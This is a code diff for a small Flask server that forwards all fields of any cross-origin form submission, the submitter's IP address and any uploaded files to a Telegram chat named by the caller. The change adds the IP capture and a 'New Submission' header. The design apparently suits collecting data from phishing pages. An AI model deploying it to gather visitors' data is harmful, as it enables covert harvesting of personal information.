@@ -7,91 +7,138 @@ from flask_cors import CORS
 app = Flask(__name__)
 CORS(app)
 
+# ================= CONFIG =================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
+
 if not BOT_TOKEN:
-    raise RuntimeError("BOT_TOKEN is not set")
+    raise RuntimeError("❌ BOT_TOKEN is not set")
 
 TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 
-# 🔁 Retry helper
-def send_with_retry(url, **kwargs):
-    for _ in range(3):
+# ================= RETRY FUNCTION =================
+def send_with_retry(url, method="post", max_attempts=3, **kwargs):
+    """
+    Send request to Telegram with retry
+    """
+    for attempt in range(max_attempts):
         try:
-            res = requests.post(url, timeout=30, **kwargs)
-            if res.ok and res.json().get("ok"):
-                return True
-        except:
-            pass
+            if method.lower() == "post":
+                res = requests.post(url, timeout=30, **kwargs)
+            else:
+                res = requests.get(url, timeout=30, **kwargs)
+
+            if res.ok:
+                data = res.json()
+                if data.get("ok"):
+                    return True
+                else:
+                    print("❌ Telegram API error:", data)
+
+        except Exception as e:
+            print(f"⚠️ Attempt {attempt+1} failed:", str(e))
+
     return False
 
 
+# ================= HOME =================
 @app.route("/", methods=["GET"])
 def home():
-    return "Server running"
+    return "✅ Server running"
 
 
+# ================= MAIN ENDPOINT =================
 @app.route("/send", methods=["POST"])
 def send():
-    chat_id = request.form.get("chat_id")
+    try:
+        chat_id = request.form.get("chat_id")
 
-    if not chat_id:
-        return jsonify({"ok": False, "error": "chat_id missing"}), 400
+        if not chat_id:
+            return jsonify({"ok": False, "error": "chat_id missing"}), 400
 
-    # ---------- SEND TEXT ----------
-    text_lines = []
+        # ---------- USER IP ----------
+        user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
 
-    for key in request.form:
-        if key != "chat_id":
-            text_lines.append(f"{key}: {request.form.get(key)}")
+        # ---------- BUILD MESSAGE ----------
+        text_lines = [
+            "📱 New Submission",
+            f"IP: {user_ip}",
+            ""
+        ]
 
-    text = "\n".join(text_lines)
+        for key in request.form:
+            if key != "chat_id":
+                value = request.form.get(key)
+                text_lines.append(f"{key}: {value}")
 
-    if not send_with_retry(
-        f"{TG_API}/sendMessage",
-        json={"chat_id": chat_id, "text": text}
-    ):
-        return jsonify({"ok": False, "error": "Message failed"}), 500
+        text = "\n".join(text_lines)
 
-    # ---------- SEND FILES ----------
-    sent = 0
-    failed = 0
+        # ---------- SEND TEXT ----------
+        text_sent = send_with_retry(
+            f"{TG_API}/sendMessage",
+            json={
+                "chat_id": chat_id,
+                "text": text
+            }
+        )
 
-    for file in request.files.values():
-        if not file.filename:
-            continue
+        if not text_sent:
+            return jsonify({
+                "ok": False,
+                "error": "Failed to send message"
+            }), 500
 
-        mime, _ = mimetypes.guess_type(file.filename)
+        # ---------- SEND FILES ----------
+        sent_count = 0
+        failed_count = 0
 
-        try:
-            if mime and mime.startswith("image"):
-                ok = send_with_retry(
-                    f"{TG_API}/sendPhoto",
-                    data={"chat_id": chat_id},
-                    files={"photo": (file.filename, file.stream)}
-                )
-            else:
-                ok = send_with_retry(
-                    f"{TG_API}/sendDocument",
-                    data={"chat_id": chat_id},
-                    files={"document": (file.filename, file.stream)}
-                )
+        for file_key in request.files:
+            file = request.files[file_key]
 
-            if ok:
-                sent += 1
-            else:
-                failed += 1
+            if not file or not file.filename:
+                continue
 
-        except:
-            failed += 1
+            mime_type, _ = mimetypes.guess_type(file.filename)
 
-    return jsonify({
-        "ok": True,
-        "sent": sent,
-        "failed": failed
-    })
+            try:
+                if mime_type and mime_type.startswith("image"):
+                    success = send_with_retry(
+                        f"{TG_API}/sendPhoto",
+                        data={"chat_id": chat_id},
+                        files={"photo": (file.filename, file.stream)}
+                    )
+                else:
+                    success = send_with_retry(
+                        f"{TG_API}/sendDocument",
+                        data={"chat_id": chat_id},
+                        files={"document": (file.filename, file.stream)}
+                    )
+
+                if success:
+                    sent_count += 1
+                else:
+                    failed_count += 1
+
+            except Exception as e:
+                print("❌ File send error:", str(e))
+                failed_count += 1
+
+        # ---------- FINAL RESPONSE ----------
+        return jsonify({
+            "ok": True,
+            "sent": sent_count,
+            "failed": failed_count
+        })
+
+    except Exception as e:
+        print("🔥 SERVER ERROR:", str(e))
+        return jsonify({
+            "ok": False,
+            "error": "Internal server error"
+        }), 500
 
 
+# ================= RUN =================
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
